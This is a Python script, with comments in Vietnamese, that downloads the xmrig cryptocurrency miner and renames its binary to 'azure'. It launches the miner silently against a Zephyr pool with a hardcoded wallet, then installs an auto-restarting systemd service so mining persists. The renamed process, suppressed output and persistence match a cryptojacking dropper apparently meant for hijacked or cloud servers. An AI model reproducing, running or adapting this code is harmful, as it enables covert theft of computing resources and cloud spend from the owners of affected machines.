import subprocess
import os
import shutil
import urllib.request
import tarfile

def update_system():
	# Cập nhật hệ thống và thiết lập vm.nr_hugepages
	subprocess.run(['sudo', 'apt-get', 'update'])
	subprocess.run(['sudo', 'sysctl', '-w', 'vm.nr_hugepages=1280'])
	subprocess.run(['sudo', 'bash', '-c', 'echo vm.nr_hugepages=1280 >> /etc/sysctl.conf'])

def install_packages():
	# Cài đặt các gói cần thiết
	subprocess.run(['sudo', 'apt-get', 'install', '-y', 'git', 'wget', 'screen'])

def setup_directories():
	# Thiết lập các thư mục
	work_dir = '/usr/share/work'
	os.makedirs(work_dir, exist_ok=True)
	return work_dir

def download_and_extract_xmrig(version, work_dir):
	# Tải và giải nén xmrig
	tar_url = f'https://github.com/xmrig/xmrig/releases/download/v{version}/xmrig-{version}-linux-x64.tar.gz'
	tar_file = f'xmrig-{version}-linux-x64.tar.gz'
	download_path = os.path.join(work_dir, tar_file)

	urllib.request.urlretrieve(tar_url, download_path)

	with tarfile.open(download_path, 'r:gz') as tar:
		tar.extractall(path=work_dir)

	# Đổi tên tệp xmrig
	xmrig_dir = os.path.join(work_dir, f'xmrig-{version}')
	xmrig_path = os.path.join(xmrig_dir, 'xmrig')
	renamed_path = os.path.join(xmrig_dir, 'azure')  # Đổi tên thành 'azure'
	os.rename(xmrig_path, renamed_path)
	return renamed_path

def start_xmrig(pool, username, cpu_threads=None, gpu_enabled=True, gpu_type='auto'):
	# Bắt đầu xmrig
	donate_level = 1
	algo = 'rx/0'
	work_dir = setup_directories()
	xmrig_path = download_and_extract_xmrig('6.21.0', work_dir)

	cmd = [f'{xmrig_path}', '--donate-level', str(donate_level), '-o', pool, '-u', f'{username}.ws-p x', '-a', algo, '-k', '--tls']

	if cpu_threads is not None:
		cmd.extend(['--cpu', str(cpu_threads)])

	if gpu_enabled:
		if gpu_type == 'auto':
			cmd.append('--opencl')  # Sử dụng tự động phát hiện OpenCL
		elif gpu_type == 'cuda':
			cmd.append('--cuda')  # Sử dụng NVIDIA CUDA cho GPU mining

	subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def create_systemd_service_file(service_name, executable_path, description=""):
	# Đường dẫn tới tệp dịch vụ systemd
	service_file_path = f'/etc/systemd/system/{service_name}.service'

	# Nội dung của tệp dịch vụ systemd
	service_content = f"""\
[Unit]
Description={description}
After=network.target

[Service]
Type=simple
ExecStart={executable_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""

	# Ghi nội dung vào tệp dịch vụ systemd
	with open(service_file_path, 'w') as service_file:
		service_file.write(service_content)

	print(f"Đã tạo tệp dịch vụ systemd: {service_file_path}")

if __name__ == "__main__":
	# Cập nhật hệ thống và cài đặt gói
	update_system()
	install_packages()
	
	# Thông tin cho việc khởi chạy xmrig
	pool = 'ca-zephyr.miningocean.org:5432'
	username = 'ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB'
	
	start_xmrig(pool, username, cpu_threads=None, gpu_enabled=True, gpu_type='auto')

	# Tạo và cài đặt dịch vụ systemd
	service_name = 'xmrig'
	executable_path = '/usr/bin/python3 /script.py'  # Đường dẫn tuyệt đối đến script của bạn
	
	description = 'XMrig Miner'

	create_systemd_service_file(service_name, executable_path, description)

	# Reload và kích hoạt dịch vụ
	reload_command = "sudo systemctl daemon-reload"
	enable_command = "sudo systemctl enable xmrig.service"
	start_command = "sudo systemctl start xmrig.service"

	try:
		subprocess.run(reload_command, shell=True, check=True)
		print("Reloaded systemd daemon successfully.")
	except subprocess.CalledProcessError as e:
		print(f"Error reloading systemd daemon: {e}")

	try:
		subprocess.run(enable_command, shell=True, check=True)
		print("Enabled xmrig service successfully.")
	except subprocess.CalledProcessError as e:
		print(f"Error enabling xmrig service: {e}")

	try:
		subprocess.run(start_command, shell=True, check=True)
		print("Started xmrig service successfully.")
	except subprocess.CalledProcessError as e:
		print(f"Error starting xmrig service: {e}")
